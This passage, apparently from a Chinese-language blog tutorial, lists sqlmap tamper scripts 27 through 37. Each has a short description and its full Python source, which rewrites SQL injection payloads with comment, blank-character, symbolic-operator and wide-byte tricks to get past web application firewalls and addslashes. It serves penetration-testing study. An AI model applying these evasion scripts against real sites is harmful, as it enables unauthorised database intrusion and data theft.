class="line">        * MSSQL</span><br><span class="line">        * SQLite</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line">        * Used during the ZeroNights SQL injection challenge,</span><br><span class="line">          https://proton.onsec.ru/contest/</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                randomStr = &#x27;&#x27;.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))</span><br><span class="line">                retVal += &quot;--%s%%0A&quot; % randomStr</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>27.space2hash  使用%23(rand)%0A来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a pound character (&#x27;#&#x27;) followed by</span><br><span class="line">    a random string and a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 4.0, 5.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line">        * Used during the ModSecurity SQL injection challenge,</span><br><span class="line">          http://modsecurity.org/demo/challenge.html</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                randomStr = &#x27;&#x27;.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))</span><br><span class="line">                retVal += &quot;%%23%s%%0A&quot; % randomStr</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>28.space2morehash  使用多个%23(rand)%0A来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a pound character (&#x27;#&#x27;) followed by</span><br><span class="line">    a random string and a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL &gt;= 5.1.13</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.1.41</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line">        * Used during the ModSecurity SQL injection challenge,</span><br><span class="line">          http://modsecurity.org/demo/challenge.html</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def process(match):</span><br><span class="line">        word = match.group(&#x27;word&#x27;)</span><br><span class="line">        randomStr = &#x27;&#x27;.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))</span><br><span class="line"></span><br><span class="line">        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:</span><br><span class="line">            return match.group().replace(word, &quot;%s%%23%s%%0A&quot; % (word, randomStr))</span><br><span class="line">        else:</span><br><span class="line">            return match.group()</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        payload = re.sub(r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;, lambda match: process(match), payload)</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                randomStr = &#x27;&#x27;.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))</span><br><span class="line">                retVal += &quot;%%23%s%%0A&quot; % randomStr</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>29.space2mssqlblank  针对MSSQL使用特定的字符替换空格<br> 特定的字符(’%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a random blank character from a</span><br><span class="line">    valid set of alternate characters</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * Microsoft SQL Server</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2000</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT%0Eid%0DFROM%07users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # ASCII table:</span><br><span class="line">    #   SOH     01      start of heading</span><br><span class="line">    #   STX     02      start of text</span><br><span class="line">    #   ETX     03      end of text</span><br><span class="line">    #   EOT     04      end of transmission</span><br><span class="line">    #   ENQ     05      enquiry</span><br><span class="line">    #   ACK     06      acknowledge</span><br><span class="line">    #   BEL     07      bell</span><br><span class="line">    #   BS      08      backspace</span><br><span class="line">    #   TAB     09      horizontal tab</span><br><span class="line">    #   LF      0A      new line</span><br><span class="line">    #   VT      0B      vertical TAB</span><br><span class="line">    #   FF      0C      new page</span><br><span class="line">    #   CR      0D      carriage return</span><br><span class="line">    #   SO      0E      shift out</span><br><span class="line">    #   SI      0F      shift in</span><br><span class="line">    blanks = (&#x27;%01&#x27;, &#x27;%02&#x27;, &#x27;%03&#x27;, &#x27;%04&#x27;, &#x27;%05&#x27;, &#x27;%06&#x27;, &#x27;%07&#x27;, &#x27;%08&#x27;, &#x27;%09&#x27;, &#x27;%0B&#x27;, &#x27;%0C&#x27;, &#x27;%0D&#x27;, &#x27;%0E&#x27;, &#x27;%0F&#x27;, &#x27;%0A&#x27;)</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace, end = False, False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                end = True</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                if end:</span><br><span class="line">                    retVal += random.choice(blanks[:-1])</span><br><span class="line">                else:</span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line"></span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>30.space2mssqlhash  使用%23%0A来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a pound character (&#x27;#&#x27;) followed by</span><br><span class="line">    a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MSSQL</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1%23%0AAND%23%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                retVal += &quot;%23%0A&quot;</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>31.space2mysqlblank  针对MYSQL使用特定的字符来替换空格<br> 特定的字符(’%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a random blank character from a</span><br><span class="line">    valid set of alternate characters</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.1</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT%0Bid%0DFROM%0Cusers&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # ASCII table:</span><br><span class="line">    #   TAB     09      horizontal TAB</span><br><span class="line">    #   LF      0A      new line</span><br><span class="line">    #   FF      0C      new page</span><br><span class="line">    #   CR      0D      carriage return</span><br><span class="line">    #   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)</span><br><span class="line">    blanks = (&#x27;%09&#x27;, &#x27;%0A&#x27;, &#x27;%0C&#x27;, &#x27;%0D&#x27;, &#x27;%0B&#x27;)</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>32.space2mysqldash 针对MYSQL使用–%0A来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a dash comment (&#x27;--&#x27;) followed by</span><br><span class="line">    a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line">        * MSSQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls.</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1--%0AAND--%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                retVal += &quot;--%0A&quot;</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>33.space2plus  主要用于使用+替换空格符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with plus (&#x27;+&#x27;)</span><br><span class="line">    Notes:</span><br><span class="line">        * Is this any useful? The plus get&#x27;s url-encoded by sqlmap engine</span><br><span class="line">          invalidating the query afterwards</span><br><span class="line">        * This tamper script works against all databases</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT+id+FROM+users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;+&quot;</span><br><span class="line">                    continue</span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;+&quot;</span><br><span class="line">                continue</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>34.space2randomblank主要用”%09”, “%0A”, “%0C”, “%0D”替换注入中的空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a random blank character from a</span><br><span class="line">    valid set of alternate characters</span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT%0Did%0DFROM%0Ausers&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # ASCII table:</span><br><span class="line">    #   TAB     09      horizontal TAB</span><br><span class="line">    #   LF      0A      new line</span><br><span class="line">    #   FF      0C      new page</span><br><span class="line">    #   CR      0D      carriage return</span><br><span class="line">    blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;)</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    continue</span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line">            elif payload[i] == &#x27; &#x27; and not doublequote and not quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                continue</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>35.symboliclogical  该插件主要是在and被过来后使用&amp;&amp; 以及||</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||)</span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    &quot;1 %26%26 &#x27;1&#x27;=&#x27;1&quot;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload))</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>36.unionalltounion 该插件主要是替换掉union all select 里面的all</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces UNION ALL SELECT with UNION SELECT</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;-1 UNION ALL SELECT&#x27;)</span><br><span class="line">    &#x27;-1 UNION SELECT&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload</span><br></pre></td></tr></table></figure>

<p>37.unmagicquotes  主要用在宽字节注入，绕过magic_quotes&#x2F;addslashes</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces quote character (&#x27;) with a multi-byte combo %bf%27 together with</span><br><span class="line">    generic comment at the end (to make it work)</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful for bypassing magic_quotes/addslashes feature</span><br><span class="line">    Reference:</span><br><span class="line">        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string</span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND 1=1&quot;)</span><br><span class="line">    &#x27;1%bf%27-- &#x27;</span><br><span class="line">    